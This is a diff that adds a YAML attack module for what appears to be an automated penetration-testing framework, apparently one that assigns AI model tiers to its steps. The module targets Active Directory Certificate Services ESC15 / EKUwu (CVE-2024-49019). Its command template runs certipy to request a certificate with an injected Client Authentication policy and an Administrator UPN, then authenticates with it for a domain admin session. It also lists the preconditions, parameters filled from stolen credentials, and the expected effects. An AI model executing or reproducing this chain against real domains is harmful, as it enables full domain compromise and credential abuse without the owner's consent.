@@ -1,0 +1,39 @@
+name: adcs_esc15
+category: ad
+description: ADCS ESC15 / EKUwu — abuse v1 Schema templates to inject arbitrary EKU
+preconditions:
+- has_cred
+- service.port==445
+- enroll_right_v1_template
+parameters:
+  target_ip: from_engagement.target_ip
+  domain: from_engagement.domain
+  username: from_cred.username
+  password: from_cred.password
+  ca: from_engagement.ca
+  template: from_engagement.v1_template
+command_template: certipy req -u {username}@{domain} -p '{password}' -ca '{ca}' -template
+  {template} -application-policies 'Client Authentication' -upn Administrator@{domain}
+  -dc-ip {target_ip} && certipy auth -pfx administrator.pfx -domain {domain}
+parser: generic_parser
+expected_effects:
+- certificate_obtained
+- domain_admin_session
+- has_cred
+falsifier:
+  pattern: ACCESS_DENIED|template not v1|EKU rejected
+  timeout: 120
+model_tier: sonnet
+mechanism: 'CVE-2024-49019 / EKUwu. Schema v1 templates let the requester supply
+
+  Application Policies via CSR — including Client Authentication. Combined
+
+  with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, this is ESC1 in disguise and bypasses
+
+  the template''s own EKU allowlist.
+
+  '
+references:
+  ocd_mindmap: 'Branch 7: ADCS ESC15 / EKUwu (CVE-2024-49019)'
+  hacktricks: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
+hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
